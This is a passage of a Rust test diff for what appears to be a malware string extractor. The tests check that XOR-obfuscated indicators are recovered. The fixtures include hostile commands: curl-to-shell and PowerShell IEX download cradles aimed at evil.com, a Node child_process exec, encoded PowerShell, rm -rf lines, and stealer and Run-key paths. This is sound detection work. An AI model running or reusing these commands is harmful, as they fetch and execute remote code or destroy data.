+                .any(|r| r.kind == Some(StringKind::Path)
+                    || r.kind == Some(StringKind::SuspiciousPath)),
+            "/etc/passwd should be detected as path"
+        );
+
+    // Test /dev/urandom
+    let path3 = b"/dev/urandom";
+    let xored3: Vec<u8> = path3
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+    let results3 = extract_custom_xor_strings(&xored3, key, 4, false);
+    assert!(
+        results3.iter().any(|r| r.kind == Some(StringKind::Path)),
+        "/dev/urandom should be detected as path"
+    );
+}
+
+#[test]
+fn test_bizarre_legitimate_iocs_pass() {
+    // Test that bizarre but legitimate IOCs pass through the filter
+    // This ensures high-value patterns bypass strict filtering
+    let key = b"TESTKEY";
+
+    let test_cases = vec![
+        // Shell redirections with special chars
+        ("osascript 2>&1 <<EOD", "heredoc with redirect"),
+        ("bash -c 'curl http://evil.com | sh'", "pipe in shell"),
+        (
+            "python -c \"import os; os.system('ls')\"",
+            "python one-liner",
+        ),
+        ("sleep 3; rm -rf /tmp/bad", "sleep and rm commands"),
+        (
+            "open -a /bin/bash --args -c \"sleep 3; rm -rf '%s'\"",
+            "macOS open with nested shell command",
+        ),
+        // Complex paths with special chars
+        (
+            "/usr/bin/python -m http.server 8080",
+            "python command with args",
+        ),
+        // URLs with ports and special chars
+        ("https://192.168.1.1:8080/api/v1", "URL with IP and port"),
+        ("http://evil.com:443/path", "URL with port"),
+        // IP addresses (need alphabetic context - pure numeric IPs are filtered out to avoid false positives)
+        ("Server:192.168.1.100", "IP address with context"),
+        ("Connect:45.33.32.156", "IP address with context"),
+        // Unicode escapes (legitimate obfuscation)
+        ("decode\\x20this\\x20data", "hex escape sequences"),
+        ("string\\u0041test", "unicode escape"),
+        // Shell commands with special chars that are NOT garbage
+        ("xattr -d com.apple.quarantine", "xattr command"),
+        ("curl -X POST -H 'Content-Type: json'", "curl with headers"),
+        ("/bin/bash -c 'echo test'", "bash command"),
+        ("perl -e 'print \"test\"'", "perl one-liner"),
+        // PowerShell examples (Windows malware patterns)
+        (
+            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\"",
+            "powershell download cradle",
+        ),
+        (
+            "powershell -ExecutionPolicy Bypass -File script.ps1",
+            "powershell bypass execution policy",
+        ),
+        (
+            "powershell -encodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
+            "powershell encoded command",
+        ),
+        (
+            "cmd.exe /c powershell -nop -w hidden -c IEX",
+            "cmd.exe launching powershell",
+        ),
+        // JavaScript/Node.js examples (obfuscated malware patterns)
+        (
+            "eval(atob('ZG9jdW1lbnQubG9jYXRpb24uaHJlZg=='))",
+            "javascript eval with base64",
+        ),
+        (
+            "require('child_process').exec('curl http://evil.com')",
+            "nodejs child_process exec",
+        ),
+        (
+            "Function('return this')().eval('malicious code')",
+            "javascript obfuscated eval",
+        ),
+    ];
+
+    for (plaintext, description) in test_cases {
+        let xored: Vec<u8> = plaintext
+            .as_bytes()
+            .iter()
+            .enumerate()
+            .map(|(i, &b)| b ^ key[i % key.len()])
+            .collect();
+
+        let results = extract_custom_xor_strings(&xored, key, 10, false);
+        let found = !results.is_empty();
+
+        assert!(
+            found,
+            "Should PASS: '{}' - {} (got {} results)",
+            plaintext,
+            description,
+            results.len()
+        );
+    }
+}
+
+#[test]
+fn test_rolling_xor_single_byte_key() {
+    // Test rolling XOR with a single-byte key
+    let key = [0x42u8];
+    let pattern1 = b"%USERPROFILE%";
+    let pattern2 = b"HKEY_CURRENT_USER";
+
+    // Create data with both patterns XOR'd
+    let mut data = vec![0x00u8; 200];
+
+    // XOR pattern1 at offset 30
+    for (i, &b) in pattern1.iter().enumerate() {
+        data[30 + i] = b ^ key[0];
+    }
+
+    // XOR pattern2 at offset 80
+    for (i, &b) in pattern2.iter().enumerate() {
+        data[80 + i] = b ^ key[0];
+    }
+
+    let results = extract_rolling_xor_with_known_plaintext(&data, 8, &[]);
+
+    // Should find the patterns
+    let found_userprofile = results.iter().any(|r| r.value.contains("USERPROFILE"));
+    let found_hkey = results.iter().any(|r| r.value.contains("HKEY"));
+
+    assert!(
+        found_userprofile || found_hkey,
+        "Should detect at least one pattern with rolling XOR. Results: {:?}",
+        results.iter().map(|r| &r.value).collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn rolling_xor_region_decodes_with_key_aligned_to_match() {
+    // A 3-byte key, and anchors 4 KB in: the decoded region starts 4096
+    // bytes before the match, which is not a multiple of the key length.
+    let key = [0x01, 0x02, 0x03];
+    let mut data = vec![0u8; 10_000];
+    for (at, text) in [
+        (5003, &b"%USERPROFILE%\\Documents\\stealer.log"[..]),
+        (5204, &b"HKEY_CURRENT_USER\\Software\\Run"[..]),
+    ] {
+        for (i, &b) in text.iter().enumerate() {
+            data[at + i] = b ^ key[i % key.len()];
+        }
+    }
+    let values: Vec<String> = extract_rolling_xor_with_known_plaintext(&data, 8, &[])
+        .into_iter()
+        .map(|s| s.value)
+        .collect();
+    assert!(
+        values.contains(&"%USERPROFILE%\\Documents\\stealer.log".to_owned()),
+        "{values:?}"
+    );
+    assert!(
+        values.contains(&"HKEY_CURRENT_USER\\Software\\Run".to_owned()),
+        "{values:?}"
+    );
+}
+
+#[test]
+fn test_rolling_xor_no_false_positives() {
+    // Random data should not produce false positives
+    let data: Vec<u8> = (0..500u32)
+        .map(|i| u8::try_from((i * 17 + 31) % 256).unwrap_or(0))
+        .collect();
+    let results = extract_rolling_xor_with_known_plaintext(&data, 8, &[]);
+
+    // Should have few or no results on random data
+    assert!(
+        results.len() < 5,
+        "Should have few false positives on random data. Got {} results",
+        results.len()
+    );
+}
